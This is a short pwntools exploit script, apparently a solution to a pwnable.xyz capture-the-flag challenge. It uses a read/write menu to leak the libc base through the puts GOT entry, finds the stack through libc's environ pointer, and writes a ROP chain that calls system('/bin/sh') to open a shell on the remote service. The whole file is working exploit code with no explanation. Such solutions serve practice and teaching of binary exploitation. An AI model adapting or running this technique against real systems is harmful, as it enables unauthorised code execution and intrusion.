###leak stack with environ
from pwn import *

###Util
def read(addr):
    r.sendlineafter('> ','1')
    r.sendlineafter('Addr: ',str(addr))
    return r.recvline()[:-1]

def write(addr,data):
    r.sendlineafter('> ','2')
    r.sendlineafter('Addr: ',str(addr))
    r.sendlineafter('Value: ',str(data))

def leave():
    r.sendlineafter('> ','0')

###Addr
#  libc2.28(alpine)
puts_got = 0x600fa0
puts_offset = 0x6fd60
environ_offset = 0x3ba098
system_offset = 0x42840
bin_sh_offset = 0x17db42

###ROPgadget
pop_rdi = 0x400a43

###Exploit
r = remote('svc.pwnable.xyz',30019)

puts_addr = u64(read(puts_got)+b'\x00\x00')
libc_base = puts_addr-puts_offset
print(hex(libc_base))

stack_addr = u64(read(environ_offset+libc_base)+b'\x00\x00')-0xf8
print(hex(stack_addr))

write(stack_addr+0x8,pop_rdi)
write(stack_addr+0x10,bin_sh_offset+libc_base)
write(stack_addr+0x18,system_offset+libc_base)

leave()
r.interactive()

